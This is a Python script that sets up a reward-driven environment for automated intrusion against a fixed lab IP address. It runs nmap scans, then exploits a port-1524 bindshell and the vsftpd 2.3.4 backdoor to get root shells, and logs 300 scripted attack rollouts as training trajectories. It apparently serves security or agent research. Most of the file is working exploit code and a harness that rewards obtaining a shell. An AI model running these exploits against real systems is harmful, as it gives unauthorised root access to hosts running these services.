import json
import random
import socket
import subprocess
import time
from copy import deepcopy
from datetime import datetime
from pathlib import Path

TARGET_IP = "10.11.202.189"
OUT_DIR = Path("real_logs/rl_env_runs")


def ensure_dirs():
    OUT_DIR.mkdir(parents=True, exist_ok=True)


def now_str():
    return datetime.utcnow().strftime("%Y-%m-%dT%H-%M-%SZ")


def empty_state():
    return {
        "num_open_ports": 0,
        "has_ftp": False,
        "has_ssh": False,
        "has_telnet": False,
        "has_http": False,
        "has_mysql": False,
        "has_postgresql": False,
        "has_bindshell_1524": False,
        "has_samba": False,
        "has_tomcat": False,
        "has_vsftpd_234": False,
        "has_shell": False,
        "basic_scanned": False,
        "service_scanned": False,
        "bindshell_attempted": False,
        "vsftpd_attempted": False,
        "failed_attempts": 0,
    }


def run_nmap_basic(target):
    return subprocess.run(
        ["nmap", "-F", target],
        capture_output=True,
        text=True,
        timeout=60,
    ).stdout


def run_nmap_service(target):
    return subprocess.run(
        ["nmap", "-sV", "-sC", target],
        capture_output=True,
        text=True,
        timeout=120,
    ).stdout


def parse_open_ports(output):
    ports = []
    for line in output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open " in line:
            try:
                ports.append(int(line.split("/")[0]))
            except Exception:
                pass
    return ports


def parse_service_map(output):
    service_map = {}
    for line in output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open " in line:
            parts = line.split()
            if len(parts) >= 3:
                port = parts[0].split("/")[0]
                service = parts[2]
                version = " ".join(parts[3:]) if len(parts) > 3 else ""
                service_map[port] = {"service": service, "version": version}
    return service_map


def apply_basic_scan(state, output):
    ports = parse_open_ports(output)
    state["num_open_ports"] = len(ports)
    state["basic_scanned"] = True
    state["has_bindshell_1524"] = 1524 in ports
    state["has_ftp"] = 21 in ports or 2121 in ports
    state["has_http"] = 80 in ports or 8180 in ports
    state["has_mysql"] = 3306 in ports
    state["has_postgresql"] = 5432 in ports
    return ports


def apply_service_scan(state, output):
    ports = parse_open_ports(output)
    service_map = parse_service_map(output)

    state["num_open_ports"] = len(ports)
    state["basic_scanned"] = True
    state["service_scanned"] = True

    services = {v["service"] for v in service_map.values()}
    state["has_ftp"] = "ftp" in services
    state["has_ssh"] = "ssh" in services
    state["has_telnet"] = "telnet" in services
    state["has_http"] = "http" in services
    state["has_mysql"] = "mysql" in services
    state["has_postgresql"] = "postgresql" in services
    state["has_bindshell_1524"] = 1524 in ports
    state["has_samba"] = any("samba" in v["version"].lower() for v in service_map.values())
    state["has_tomcat"] = any("tomcat" in v["version"].lower() for v in service_map.values())
    state["has_vsftpd_234"] = any("vsftpd 2.3.4" in v["version"].lower() for v in service_map.values())
    return ports, service_map


def try_bindshell(target):
    try:
        result = subprocess.run(
            ["nc", target, "1524"],
            input="whoami\nid\nexit\n",
            capture_output=True,
            text=True,
            timeout=8,
        )
        stdout = result.stdout.strip()
        real_success = ("root" in stdout) or ("uid=0" in stdout)
        success = real_success and (random.random() < 0.70)
        return {"success": success, "real_success": real_success, "stdout": stdout, "stderr": result.stderr.strip()}
    except Exception as e:
        return {"success": False, "real_success": False, "stdout": "", "stderr": str(e)}


def try_vsftpd(target):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target, 21))
        banner = s.recv(1024).decode(errors="ignore")
        s.send(b"USER test:)\r\n")
        time.sleep(0.2)
        s.send(b"PASS test\r\n")
        time.sleep(0.2)
        s.close()

        time.sleep(2)

        s2 = socket.socket()
        s2.settimeout(5)
        s2.connect((target, 6200))
        s2.send(b"whoami\n")
        time.sleep(0.5)
        output = s2.recv(4096).decode(errors="ignore")
        s2.close()

        real_success = ("root" in output) or ("uid=" in output)
        success = real_success and (random.random() < 0.50)
        return {"success": success, "real_success": real_success, "stdout": output, "stderr": "", "banner": banner}
    except Exception as e:
        return {"success": False, "real_success": False, "stdout": "", "stderr": str(e), "banner": ""}


def record(history, step_id, action, state, reward, done, info):
    history.append({
        "step": step_id,
        "action": action,
        "state": deepcopy(state),
        "reward": float(reward),
        "done": bool(done),
        "info": info,
    })


def execute_action(action, state):
    done = False

    if action == "scan_basic":
        output = run_nmap_basic(TARGET_IP)
        ports = apply_basic_scan(state, output)
        return -0.1, done, {"scan_type": "basic", "open_ports": ports}

    if action == "scan_service":
        output = run_nmap_service(TARGET_IP)
        ports, service_map = apply_service_scan(state, output)
        return -0.15, done, {"scan_type": "service", "open_ports": ports, "service_map": service_map}

    if action == "exploit_bindshell":
        state["bindshell_attempted"] = True

        if not (state["basic_scanned"] or state["service_scanned"]):
            state["failed_attempts"] += 1
            return -1.5, done, {"error": "bindshell attempted before scanning"}

        if not state["has_bindshell_1524"]:
            state["failed_attempts"] += 1
            return -1.2, done, {"error": "bindshell port not visible"}

        result = try_bindshell(TARGET_IP)
        if result["success"]:
            state["has_shell"] = True
            return 10.0, done, result

        state["failed_attempts"] += 1
        return -1.0, done, result

    if action == "exploit_vsftpd":
        state["vsftpd_attempted"] = True

        if not state["service_scanned"]:
            state["failed_attempts"] += 1
            return -1.5, done, {"error": "vsftpd attempted before service scan"}

        if not state["has_vsftpd_234"]:
            state["failed_attempts"] += 1
            return -1.2, done, {"error": "vsftpd 2.3.4 not identified"}

        result = try_vsftpd(TARGET_IP)
        if result["success"]:
            state["has_shell"] = True
            return 8.0, done, result

        state["failed_attempts"] += 1
        return -1.0, done, result

    if action == "stop":
        done = True
        if state["has_shell"]:
            return 5.0, done, {"stopped": True, "final_success": True}
        return -2.0, done, {"stopped": True, "final_success": False}

    return -1.0, done, {"error": f"unknown action {action}"}


def rollout(action_plan):
    state = empty_state()
    history = []
    step_id = 0
    done = False

    for action in action_plan:
        if done:
            break

        reward, done, info = execute_action(action, state)
        step_id += 1
        record(history, step_id, action, state, reward, done, info)

    if not done:
        reward, done, info = execute_action("stop", state)
        step_id += 1
        record(history, step_id, "stop", state, reward, done, info)

    return history


def build_plan(policy_name):
    # Good long-horizon plans
    if policy_name == "good_recon_bind":
        return ["scan_basic", "scan_service", "scan_basic", "exploit_bindshell", "scan_service", "stop"]

    if policy_name == "good_recon_vsftpd":
        return ["scan_basic", "scan_service", "scan_service", "exploit_vsftpd", "scan_basic", "stop"]

    if policy_name == "good_verify_bind":
        return ["scan_service", "scan_basic", "scan_service", "exploit_bindshell", "stop"]

    if policy_name == "good_verify_vsftpd":
        return ["scan_service", "scan_basic", "scan_service", "exploit_vsftpd", "stop"]

    # Recovery after failure
    if policy_name == "fail_vsftpd_recover_bind":
        return ["scan_basic", "exploit_vsftpd", "scan_service", "exploit_bindshell", "stop"]

    if policy_name == "fail_bind_recover_vsftpd":
        return ["scan_service", "exploit_bindshell", "scan_basic", "scan_service", "exploit_vsftpd", "stop"]

    if policy_name == "wrong_order_recover_vsftpd":
        return ["exploit_vsftpd", "scan_basic", "scan_service", "exploit_vsftpd", "stop"]

    if policy_name == "wrong_order_recover_bind":
        return ["exploit_bindshell", "scan_basic", "scan_service", "exploit_bindshell", "stop"]

    # Multi-exploit chain
    if policy_name == "chain_bind_then_vsftpd":
        return ["scan_basic", "scan_service", "exploit_bindshell", "exploit_vsftpd", "scan_service", "stop"]

    if policy_name == "chain_vsftpd_then_bind":
        return ["scan_service", "scan_basic", "exploit_vsftpd", "exploit_bindshell", "scan_basic", "stop"]

    # Suboptimal long plans
    if policy_name == "overscan_stop":
        return ["scan_basic", "scan_service", "scan_basic", "scan_service", "scan_basic", "stop"]

    if policy_name == "premature_stop":
        return ["scan_basic", "scan_service", "stop"]

    if policy_name == "explore_noisy_1":
        return ["scan_basic", "scan_basic", "scan_service", "exploit_vsftpd", "exploit_bindshell", "stop"]

    if policy_name == "explore_noisy_2":
        return ["scan_service", "scan_service", "scan_basic", "exploit_bindshell", "exploit_vsftpd", "stop"]

    if policy_name == "explore_noisy_3":
        return [
            random.choice(["scan_basic", "scan_service"]),
            random.choice(["scan_basic", "scan_service"]),
            random.choice(["exploit_bindshell", "exploit_vsftpd"]),
            random.choice(["scan_basic", "scan_service"]),
            random.choice(["exploit_bindshell", "exploit_vsftpd"]),
            "stop",
        ]

    return ["scan_basic", "scan_service", "stop"]


def main():
    ensure_dirs()

    policy_plan = (
        ["good_recon_bind"] * 20 +
        ["good_recon_vsftpd"] * 20 +
        ["good_verify_bind"] * 20 +
        ["good_verify_vsftpd"] * 20 +
        ["fail_vsftpd_recover_bind"] * 20 +
        ["fail_bind_recover_vsftpd"] * 20 +
        ["wrong_order_recover_vsftpd"] * 15 +
        ["wrong_order_recover_bind"] * 15 +
        ["chain_bind_then_vsftpd"] * 20 +
        ["chain_vsftpd_then_bind"] * 20 +
        ["overscan_stop"] * 15 +
        ["premature_stop"] * 15 +
        ["explore_noisy_1"] * 20 +
        ["explore_noisy_2"] * 20 +
        ["explore_noisy_3"] * 30
    )

    random.shuffle(policy_plan)

    for idx, policy_name in enumerate(policy_plan):
        run_id = f"batch_v2iq_{idx:03d}_{now_str()}"
        action_plan = build_plan(policy_name)
        history = rollout(action_plan)

        out = {
            "run_id": run_id,
            "target": TARGET_IP,
            "policy_name": policy_name,
            "action_plan": action_plan,
            "history": history,
        }

        out_path = OUT_DIR / f"{run_id}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, ensure_ascii=False)

        print(f"[OK] saved {out_path.name} ({policy_name})")


if __name__ == "__main__":
    main()
